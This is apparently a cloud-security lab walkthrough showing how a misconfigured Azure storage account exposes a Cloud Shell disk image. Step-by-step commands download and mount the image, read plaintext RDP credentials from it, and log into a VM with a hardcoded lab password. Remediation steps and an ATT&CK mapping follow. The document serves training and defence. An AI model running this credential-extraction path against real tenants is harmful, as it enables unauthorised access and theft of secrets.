# Cloud Shell Storage Exposure

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Storage / RBAC

## Scenario

Azure Cloud Shell persists the user's home directory as a disk image (`.img` file) stored
in a file share within a storage account. The storage account in this lab has insufficient
RBAC controls — an attacker with access to the storage account can download the disk image,
mount it locally, and extract sensitive data (credentials, tokens, shell history).

> **Note:** The `.img` file in this lab is intentionally sanitised and ~2 MB. Real
> Cloud Shell images are ~5 GB but follow the same format.

## Attack Path

```
[Attacker]  (Storage Account Reader or shared key access)
    |
    v
az storage share list  -->  find the file share
    |
    v
az storage file download  -->  acc_noher.img
    |
    v
sudo mount -o loop acc_noher.img /mnt/cs
    |
    v
cat /mnt/cs/vm_access.txt  -->  RDP credentials
    |
    v
xfreerdp /v:<vm-ip> /u:ytirucsboybytiruces /p:... /cert-ignore
    |
    v
type C:\flag.txt
```

### Step 1 — Find the file share

```bash
az storage share list --account-name <storage_account>
```

### Step 2 — Download the disk image

```bash
az storage file download \
  --account-name <storage_account> \
  --share-name <share_name> \
  --path ".cloudconsole/acc_noher.img" \
  --dest ./acc_noher.img
```

### Step 3 — Mount and extract credentials

```bash
sudo mkdir -p /mnt/cs
sudo mount -o loop acc_noher.img /mnt/cs
ls /mnt/cs               # vm_access.txt is visible here
cat /mnt/cs/vm_access.txt
sudo umount /mnt/cs
```

### Step 4 — Get the VM public IP

```bash
az vm show -g admin-vm-rg -n admin-vm --show-details --query publicIps -o tsv
```

### Step 5 — RDP into the VM and read the flag

```bash
xfreerdp /v:<vm-ip> /u:ytirucsboybytiruces /p:'IWillNotRememberThisPassword1.' /cert-ignore /f
```

Once connected, the flag is on the Desktop — open it directly or run:

```
type C:\Users\Public\Desktop\flag.txt
```

## How to Fix in Production

1. **Lock down RBAC on Cloud Shell storage accounts**: Grant only the specific users who
   need Cloud Shell access, scoped to their file share only.
2. **Separate Cloud Shell storage from other workloads**: Place Cloud Shell storage
   accounts in a dedicated resource group with a deny-all policy by default.
3. **Enable Microsoft Defender for Storage** to alert on unexpected file share access.
4. **Audit regularly** with `az role assignment list` to catch stale permissions.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Cloud Storage | T1530 |
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Valid Accounts: Cloud Accounts | T1078.004 |
